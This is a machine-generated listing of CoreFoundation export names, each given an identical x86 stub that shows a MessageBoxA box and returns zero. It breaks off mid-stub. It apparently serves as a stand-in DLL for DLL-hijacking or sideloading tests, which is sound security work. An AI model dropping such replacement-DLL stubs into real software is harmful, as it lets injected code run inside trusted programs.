CFPropertyListCreateWithData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPropertyListCreateWithStream
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPropertyListCreateXMLData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPropertyListIsValid
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPropertyListWrite
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPropertyListWriteToStream
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFQSortArray
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFReadStreamClose
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFReadStreamCopyError
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFReadStreamCopyProperty
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFReadStreamCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFReadStreamCreateWithBytesNoCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFReadStreamCreateWithData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFReadStreamCreateWithFile
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFReadStreamGetBuffer
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFReadStreamGetError
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFReadStreamGetInfoPointer
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFReadStreamGetStatus
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFReadStreamGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFReadStreamHasBytesAvailable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFReadStreamOpen
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFReadStreamRead
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFReadStreamScheduleWithRunLoop
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFReadStreamSetClient
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFReadStreamSetProperty
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFReadStreamSignalEvent
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFReadStreamUnscheduleFromRunLoop
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRelease
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRetain
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunArrayCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunArrayDelete
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunArrayGetCount
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunArrayGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunArrayGetValueAtIndex
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunArrayGetValueAtRunArrayIndex
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunArrayInsert
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunArrayReplace
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopAddCommonMode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopAddObserver
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopAddSource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopAddTimer
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopContainsObserver
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopContainsSource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopContainsTimer
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopCopyAllModes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopCopyCurrentMode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopGetCurrent
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopGetMain
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopGetNextTimerFireDate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopIsWaiting
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopObserverCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopObserverCreateWithHandler
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopObserverDoesRepeat
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopObserverGetActivities
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopObserverGetContext
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopObserverGetOrder
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopObserverGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopObserverInvalidate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopObserverIsValid
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopPerformBlock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopRemoveObserver
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopRemoveSource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopRemoveTimer
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopRun
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopRunInMode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopSourceCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopSourceGetContext
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopSourceGetOrder
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopSourceGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopSourceInvalidate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopSourceIsValid
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopSourceSignal
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopStop
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopTimerCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopTimerCreateWithHandler
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopTimerDoesRepeat
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopTimerGetContext
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopTimerGetInterval
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopTimerGetNextFireDate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopTimerGetOrder
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopTimerGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopTimerInvalidate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopTimerIsValid
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopTimerSetNextFireDate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFRunLoopWakeUp
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSetAddValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSetApplyFunction
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSetContainsValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSetCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSetCreateCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSetCreateMutable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSetCreateMutableCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSetGetCount
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSetGetCountOfValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSetGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSetGetValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSetGetValueIfPresent
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSetGetValues
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSetRemoveAllValues
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSetRemoveValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSetReplaceValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSetSetValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFShow
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFShowStr
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketConnectToAddress
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketCopyAddress
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketCopyPeerAddress
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketCopyRegisteredSocketSignature
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketCopyRegisteredValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketCreateConnectedToSocketSignature
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketCreateRunLoopSource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketCreateWithNative
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketCreateWithSocketSignature
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketDisableCallBacks
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketEnableCallBacks
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketGetContext
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketGetDefaultNameRegistryPortNumber
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketGetNative
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketGetSocketFlags
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketInvalidate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketIsValid
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketRegisterSocketSignature
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketRegisterValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketSendData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketSetAddress
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketSetDefaultNameRegistryPortNumber
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketSetSocketFlags
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFSocketUnregister
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStorageApplyBlock
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStorageApplyFunction
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStorageCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStorageCreateWithSubrange
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStorageDeleteValues
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStorageGetConstValueAtIndex
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStorageGetCount
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStorageGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStorageGetValueAtIndex
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStorageGetValues
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStorageInsertValues
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStorageReplaceValues
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStreamCreateBoundPair
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStreamCreatePairWithPeerSocketSignature
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStreamCreatePairWithSocket
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStreamCreatePairWithSocketToHost
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringAppend
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringAppendCString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringAppendCharacters
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringAppendFormat
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringAppendFormatAndArguments
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringAppendPascalString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCapitalize
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCompare
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCompareWithOptions
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCompareWithOptionsAndLocale
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringConvertEncodingToIANACharSetName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringConvertEncodingToNSStringEncoding
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringConvertEncodingToWindowsCodepage
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringConvertIANACharSetNameToEncoding
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringConvertNSStringEncodingToEncoding
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringConvertWindowsCodepageToEncoding
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCreateArrayBySeparatingStrings
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCreateArrayWithFindResults
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCreateByCombiningStrings
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCreateCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCreateExternalRepresentation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCreateFromExternalRepresentation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCreateMutable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCreateMutableCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCreateMutableWithExternalCharactersNoCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCreateWithBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCreateWithBytesNoCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCreateWithCString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCreateWithCStringNoCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCreateWithCharacters
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCreateWithCharactersNoCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCreateWithFileSystemRepresentation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCreateWithFormat
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCreateWithFormatAndArguments
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCreateWithPascalString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCreateWithPascalStringNoCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringCreateWithSubstring
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringDelete
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringEncodingByteLengthForCharacters
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringEncodingBytesToUnicode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringEncodingCharLengthForBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringEncodingIsValidEncoding
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringEncodingListOfAvailableEncodings
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringEncodingRegisterFallbackProcedures
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringEncodingUnicodeToBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringFileSystemEncoding
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringFind
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringFindAndReplace
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringFindCharacterFromSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringFindWithOptions
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringFindWithOptionsAndLocale
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringFold
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetCString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetCStringPtr
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetCharacterAtIndex
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetCharacters
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetCharactersPtr
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetDoubleValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetFastestEncoding
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetFileSystemRepresentation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetHyphenationLocationBeforeIndex
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetIntValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetLength
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetLineBounds
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetListOfAvailableEncodings
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetMaximumSizeForEncoding
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetMaximumSizeOfFileSystemRepresentation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetMostCompatibleMacStringEncoding
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFStringGetNameOfEncoding
push 0x0
mov eax r--data
push eax
push eax
push 0x0
